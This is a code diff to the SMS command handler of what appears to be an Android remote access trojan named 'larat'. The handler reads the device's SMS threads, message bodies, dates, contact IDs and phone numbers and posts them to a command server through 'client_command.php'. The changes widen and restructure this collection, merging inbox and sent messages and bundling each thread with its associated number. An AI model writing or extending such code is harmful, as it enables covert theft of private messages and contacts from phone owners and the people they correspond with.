@@ -3,6 +3,7 @@ package com.c4wd.commands;
 import android.os.AsyncTask;
 
 import com.c4wd.larat.Constants;
+import com.c4wd.larat.LaratException;
 import com.c4wd.larat.RestClient;
 import com.c4wd.sms.SMSConstants;
 import com.c4wd.sms.SMSObject;
@@ -37,14 +38,8 @@ public class SMSCommands {
         protected void onPostExecute(Object o) {
             SMSReader reader;
             boolean outbox = false;
-            //setup our SMSReader
-            box_id = (String) context.getArgument(0);
-            if (box_id != null && box_id.compareTo("OUTBOX") == 0) {
-                reader = new SMSReader(SMSConstants.SENT, context.getContext());
-                outbox = true;
-            } else {
-                reader = new SMSReader(SMSConstants.INBOX, context.getContext());
-            }
+
+            reader = new SMSReader(SMSConstants.SMS, context.getContext());
             //get the thread ids
             List<SMSThreadInfo> threads = reader.getThreads();
 
@@ -58,14 +53,14 @@ public class SMSCommands {
                     for (SMSThreadInfo info : threads) {
                         JSONObject msg_array = new JSONObject();
                         msg_array.put("thread_id", info.getThreadId());
+                        msg_array.put("receiver", info.getNumber());
                         msg_array.put("contact_id", info.getContactId());
-                        msg_array.put("number", info.getNumber());
                         messages.put(msg_array);
                     }
 
                     //post our threads to the server, saved under the UUID
                     params.put("command", "sms_thread_list");
-                    params.put("message_type", outbox ? "SMS_THREAD_INFO_SENT" : "SMS_THREAD_INFO_INBOX");
+                    params.put("message_type", "SMS_THREAD_INFO_SENT");
                     params.put("thread_list", messages.toString());
                     params.put("uuid", uuid);
                     RestClient.post("client_command.php", params); //post results to the server
@@ -80,6 +75,7 @@ public class SMSCommands {
 
                 } catch (JSONException e) {
                     e.printStackTrace();
+                    LaratException.reportException(e);
                 }
             }
         }
@@ -128,19 +124,34 @@ public class SMSCommands {
                     if (threads.size() > 0) {
                         String uuid = UUID.randomUUID().toString();
                         RequestParams params = new RequestParams();
+                        JSONObject msg_object = new JSONObject();
                         JSONArray messages = new JSONArray();
+                        String contact_number = null;
+                        String contact_id = null;
+
+
                         for (SMSObject info : threads) {
+
+                            if (contact_number == null)
+                                contact_number = info.getAddress();
+                            if (contact_id == null)
+                                contact_id = info.getPersonId();
                             JSONObject msg_array = new JSONObject();
-                            msg_array.put("thread_id", info.getThreadId());
+                            msg_array.put("type", info.getType());
                             msg_array.put("body", info.getBody());
-                            msg_array.put("number", info.getAddress());
                             msg_array.put("date", info.getDate());
                             messages.put(msg_array);
                         }
+
+                        msg_object.put("thread_id", thread_id);
+                        msg_object.put("contact_id", contact_id == null ? "unknown" : contact_id);
+                        msg_object.put("associated_number", contact_number == null ? "unknown" : contact_number);
+                        msg_object.put("messages", messages);
+
                         //post our messages to the server, saved under the UUID
                         params.put("command", "addMessage");
                         params.put("message_type", "SMS_THREAD_OBJECT");
-                        params.put("message", messages.toString());
+                        params.put("message", msg_object.toString());
                         params.put("client_id", uuid);
                         RestClient.post("client_command.php", params); //post results to the server
 
@@ -159,11 +170,7 @@ public class SMSCommands {
                         params.put("message", "Failed to read SMS or there weren't any!");
                     }
                 } catch (Exception ex) {
-                    RequestParams params = new RequestParams();
-                    params.put("command", "addMessage");
-                    params.put("client_id", Constants.CLIENT_ID);
-                    params.put("message_type", "EXECUTION_ERROR");
-                    params.put("message", ex.getMessage());
+                    LaratException.reportException(ex);
                 }
             }
         }
